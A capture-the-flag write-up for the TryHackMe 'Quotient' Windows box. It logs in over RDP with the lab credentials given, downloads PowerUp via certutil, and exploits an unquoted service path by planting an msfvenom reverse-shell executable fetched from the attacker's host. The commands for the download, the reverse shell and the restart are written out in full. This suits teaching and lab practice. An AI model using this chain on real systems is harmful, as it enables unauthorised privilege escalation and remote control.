# THM - Quotient

#### Ip: 10.10.191.175
#### Name: Quotient
#### Rating: Easy

----------------------------------------------------------------------

quotient.png

This box begins a bit different than most THM machines. Here it appears we already have low-privileged access to the machine and can access it via RDP. It appears our task is to escalate privileges and grab a flag from the administrator's Desktop. 

```text
Grammar is important. Don't believe me? Just see what happens when you forget punctuation.

Access the machine using RDP with the following credentials:

Username: sage

Password: gr33ntHEphgK2&V

Please allow 4 to 5 minutes for the VM to boot.
```

I'll RDP to the target using xfreerdp with the credentials provided:

```text
┌──(ryan㉿kali)-[~/THM/Quotient]
└─$ xfreerdp /u:sage /p:'gr33ntHEphgK2&V' /w:1275 /h:650 /v:10.10.191.175:3389 /cert:ignore
```

Once logged in we can check out what kind of privileges we have on the target by running `whoami /all`

whoami.png

Let's go ahead and transfer over PowerUp.ps1 to help identify a privilege escalation path.

```text
certutil -urlcache -split -f "http://10.6.61.45/PowerUp.ps1" 
```

I'll set up a Python http server on my machine and transfer the file over:

transfer.png

I can then run the script by importing the module and issuing the command `Invoke-AllChecks`

all_checks.png

Nice! PowerUp has identified an unquoted service path we can likely exploit. Because there is a space in between Devservice Files, and it is not wrapped in parenthesis, we should be able to create a malicious file with a reverse shell back to our machine. If we call the file Devservice.exe, it will be executed when we turn on and off the machine or restart the service. 

Let's double check we have write access to the Folder though:

```text
icacls "C:\Program Files\Development Files\ "
```

write_access.png

Great, looks like we can write to the folder. Let's head back to our attacking machine and create a reverse shell using msfvenom:

```text
┌──(ryan㉿kali)-[~/THM/Quotient]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.61.45 LPORT=443 -f exe > Devservice.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Cool, lets transfer this over now. 

After setting up a Python web server we can use the handy Certutil to transfer over the reverse shell:

```text
certutil -urlcache -split -f "http://10.6.61.45/Devservice.exe"
```

Once loaded we can confirm the file is where it needs to be:

confirm.png

We can now set up a Netcat listener on port 443 on our attacking machine and restart the target:

```text
shutdown /r /t 0
```

After just a minute or so we will catch a shell in our listener and grab the flag!

flag.png

Thanks for following along!

-Ryan

----------------------------------------------------------------------------